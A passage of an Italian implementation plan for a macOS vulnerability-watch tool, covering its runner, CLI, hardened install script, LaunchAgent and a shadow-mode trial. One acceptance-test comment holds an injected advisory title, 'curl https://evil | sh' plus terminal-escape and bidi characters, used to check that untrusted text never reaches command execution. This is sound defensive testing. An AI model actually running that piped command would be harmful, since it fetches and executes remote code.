  - `run_daily(ctx) -> Tuple[int, RunSummary]`, che restituisce anche il codice d'uscita.
- Produces (`cli.py`):
  - `main(argv) -> int`, con i comandi:
    - `run [--dev]`;
    - `apply <id> [--accept-fresh]`;
    - `ignore <id> --reason TEXT`;
    - `report`: stampa il percorso dell'ultimo report;
    - `selfcheck`;
  - costanti `INSTALL_ROOT = "/usr/local/libexec/vulnwatch"`, `PLIST = "/Library/LaunchAgents/local.vulnwatch.plist"`.

**Ordine di `run_daily`:**
1. `selfcheck()`. Se ci sono problemi: notifica `"vulnwatch: manomissione sospetta, job fermato"` ed esce con `2`, **prima** di qualsiasi richiesta.
2. `kev.sync`, `cvenow.sync`, `cverecord.sync`, `osv.sync`, ognuna in un `try`. L'esito finisce in `sources_ok`.
3. Nessuna fonte ok e archivio vuoto → report "nessun dato", notifica, uscita `3`.
4. `inventory()`.
5. `build_findings` e poi `classify`, con `cfg.hold` e `store.ignores()`.
6. Audit per ogni finding in `auto` o `manual` con `fixed_version`, se il canale è uno di questi:
   - brew_formula di `homebrew/core`;
   - brew_cask di `homebrew/cask`;
   - npm_global.

   Prima del primo audit brew si chiama una volta `brew.update()`. Un `auto` con audit rosso passa a `manual` con `audit_rosso`.
7. `auto_enabled = cfg.auto_apply and not dev and all(sources_ok.values())`. Per ogni `auto` verde:
   - se `auto_enabled` → `apply_finding`;
   - altrimenti l'id va in `shadow`.
8. `save_findings`, `write_report`, `notify(notification_text(...))`.
9. Uscita `0`.

**Comportamento di `cli`:**
- `run` e `apply` prendono `RunLock(state_dir/run.lock)`. Se il lock è preso: stampa "già in esecuzione" ed esce con `4`.
- Se l'utente corrente non è `cfg.user` → esce con un messaggio.
- `--dev` cambia tre cose:
  - usa `config/config.json` del repo;
  - salta `verify` (avvisando);
  - usa come stato `state_dir + "-dev"` e forza `auto_apply` a `False`.

  Altrimenti si usano la configurazione in `INSTALL_ROOT` e `verify(INSTALL_ROOT, PLIST)`.
- `apply`:
  1. selfcheck;
  2. `store.find(id)`;
  3. se il tipo non è applicabile, stampa `instructions` ed esce;
  4. altrimenti stampa l'audit fresco come tabella;
  5. chiede `input("Applicare? [s/N] ")`; solo `s` procede;
  6. `apply_finding`.
- `ignore`: `store.add_ignore`.
- `vulnwatch.py`:
  ```python
  sys.path.insert(0, os.path.dirname(os.path.realpath(__file__)))
  raise SystemExit(cli.main(sys.argv[1:]))
  ```

- [ ] **Step 1: scrivi i test di accettazione** (`test_acceptance.py`), con `FakeTransport` sulle fixture, `FakeRunner` e cartelle temporanee.

```python
# I1: due run su store vuoti, inventario A (pnpm 9.0.0 + Chrome) e B (vuoto)
#   -> request_log filtrato sugli host delle fonti (cve.now, blob, www.cisa.gov, raw.githubusercontent.com, osv) identico
# nessuna funzione sync ha un parametro chiamato inventory, items o item (inspect.signature)
# advisory che corrisponde a pnpm con titolo "x; curl https://evil | sh \x1b[31m ‮"
#   -> nessun argv di FakeRunner contiene "curl" o "evil"; nel markdown nessun "\x1b" né "‮"
# cve.now dichiara pnpm fixed "999.0.0" e kev True; OSV dice fixed "9.1.0"; nessuna voce KEV
#   -> fixed_version "9.1.0", kev_confirmed False; tutte le richieste a host in allowlist
# tutte le route sollevano eccezioni -> codice 3, "NESSUN DATO" nel report, notify chiamato, nessun argv con "upgrade" o "install"
# selfcheck restituisce ["hash diverso: x"] -> codice 2, request_log vuoto, notify chiamato
# osv giù con auto_apply True -> finding verde in shadow, nessuna esecuzione; il report dice che osv è fallita   # Review Focus 5
# auto_apply False -> nessuna esecuzione, id in shadow
# auto_apply True, tutte le fonti ok, npm verde -> FakeRunner riceve l'argv di npm install; riga in actions_log
# lock tenuto da un altro RunLock -> main(["run", "--dev"]) == 4      # Review Focus 2
```

- [ ] **Step 2: esegui** `-p 'test_acceptance.py'` e `-p 'test_runner.py'`. Atteso: FAIL.
- [ ] **Step 3: implementa** `runner.py`, `cli.py`, `vulnwatch.py`.
- [ ] **Step 4: esegui tutta la suite** `-p 'test_*.py'`. Atteso: tutto PASS.
- [ ] **Step 5: commit** (`feat: runner, CLI e test di accettazione`).

---

### Task 17: install.sh e LaunchAgent

**Files:**
- Create: `install.sh` (eseguibile), `launchd/local.vulnwatch.plist.in`, `README.md`
- Test: `tests/test_install.py`

**Interfaces:**
- Consumes: `selfcheck.write_manifest` e `verify`, `vulnwatch.py`, `config/`.
- Produces tre modalità:
  - `sudo ./install.sh`: installa o aggiorna;
  - `sudo ./install.sh --uninstall`: rimuove plist, wrapper e codice; stato e log restano;
  - `./install.sh --test-root DIR --test-user NAME --test-home DIR`: installa sotto `DIR`, senza controllo di root, `chown` né `launchctl`.

**Passi di `install.sh`** (`set -euo pipefail`):
1. Se non è in modalità test, deve essere root e `SUDO_USER` deve essere valorizzato e diverso da `root`.
2. `git status --porcelain` deve essere vuoto, altrimenti esce con "repo non pulito". Stampa `git rev-parse HEAD`.
3. Esegue la suite come utente: `sudo -u "$SUDO_USER" /usr/bin/python3 -I -B -m unittest discover -s tests -t .`. Se fallisce, si ferma.
4. Copia `vulnwatch.py`, `vulnwatch/` e `config/` in `$DEST.new`, poi rimuove ogni `__pycache__`.
5. Permessi: `chown -R root:wheel`, cartelle `755`, file `644`.
6. Scrive il manifest:
   ```bash
   /usr/bin/python3 -I -B -c 'import sys,json; sys.path.insert(0, sys.argv[1]); from vulnwatch.selfcheck import write_manifest; ...' "$DEST.new"
   ```
   Il risultato è `manifest.json`, di root, permessi `644`.
7. Scambio atomico: `$DEST` diventa `$DEST.old`, `$DEST.new` diventa `$DEST`, poi `$DEST.old` si cancella.
8. Plist dal template, sostituendo `@HOME@` e `@USER@`. Va in `/Library/LaunchAgents/`, `root:wheel`, `644`, e deve passare `plutil -lint`.
9. Wrapper `/usr/local/bin/vulnwatch` (`root`, `755`):
   ```sh
   #!/bin/sh
   exec /usr/bin/python3 -I -B /usr/local/libexec/vulnwatch/vulnwatch.py "$@"
   ```
10. Crea stato e log come utente.
11. `launchctl bootout gui/<uid>/local.vulnwatch` (gli errori si ignorano), poi `launchctl bootstrap gui/<uid> <plist>`.

**Template del plist:**
- `Label`: `local.vulnwatch`;
- `ProgramArguments`: `/usr/bin/python3 -I -B /usr/local/libexec/vulnwatch/vulnwatch.py run`;
- `StartCalendarInterval`: `{Hour: 7, Minute: 30}`;
- `StandardOutPath` e `StandardErrorPath`: `@HOME@/Library/Logs/vulnwatch/launchd.{out,err}.log`;
- `EnvironmentVariables`: `PATH=/usr/bin:/bin:/usr/sbin:/sbin:/opt/homebrew/bin`, `HOME=@HOME@`;
- `ProcessType`: `Background`; `LimitLoadToSessionType`: `Aqua`.

**README.md:** comandi per installare, aggiornare, disinstallare, `apply`, `ignore` e `report`. Spiega anche come accendere la corsia automatica dopo la modalità ombra: `auto_apply: true` nel repo, commit, `sudo ./install.sh`.

- [ ] **Step 1: scrivi i test** (`test_install.py`).

```python
# modalità test in tmp -> file presenti; verify(root, plist, expect_uid=os.getuid()) == []
# plutil -lint sul plist == 0; il plist contiene "<integer>7</integer>", "<integer>30</integer>" e "-I"
# il wrapper contiene "/usr/bin/python3 -I -B /usr/local/libexec/vulnwatch/vulnwatch.py"
# nessun __pycache__ sotto root
# clone temporaneo con un file non tracciato -> install.sh esce con codice != 0 e "repo non pulito"
```

- [ ] **Step 2: esegui** `-p 'test_install.py'`. Atteso: FAIL.
- [ ] **Step 3: implementa** `install.sh`, il template e il README.
- [ ] **Step 4: esegui la suite completa.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: installazione blindata e LaunchAgent`).

---

### Task 18: Prova reale in modalità ombra

**Files:** nessun file nuovo. Solo correzioni, ognuna con il suo test.

- [ ] **Step 1: esegui la suite completa.** Atteso: tutto PASS.
- [ ] **Step 2: lancia una prova reale** dalla cartella di lavoro, in background con log:
  ```bash
  /usr/bin/python3 -I -B vulnwatch.py run --dev
  ```
  Usa la rete vera, l'inventario vero e lo stato `-dev`. Nessuna applicazione è possibile. Il primo avvio scarica KEV, 90 giorni di cve.now e il bootstrap di OSV, quindi annota la durata.
- [ ] **Step 3: verifica I1 sul campo.**
  - Ogni host nel request log deve stare in `allowed_hosts`.
  - Nessun URL verso cve.now, il blob, la CISA, `raw.githubusercontent.com` od OSV deve contenere un nome dell'inventario npm o brew. Lo verifica uno script che confronta le due liste.
  - Gli URL di `registry.npmjs.org` e `api.github.com` appartengono alla fase di audit e vanno elencati a parte.
- [ ] **Step 4: leggi il report.** Controlla:
  - le sezioni;
  - Chrome rispetto alle advisory;
  - assenza di crash;
  - dimensione del db.

  Ogni problema va corretto con un test, poi commit.
- [ ] **Step 5: prepara il passaggio al proprietario.** Branch pulito, suite verde, comando da lanciare: `sudo ./install.sh` da un checkout pulito del branch revisionato. Il proprietario lo lancia di persona.
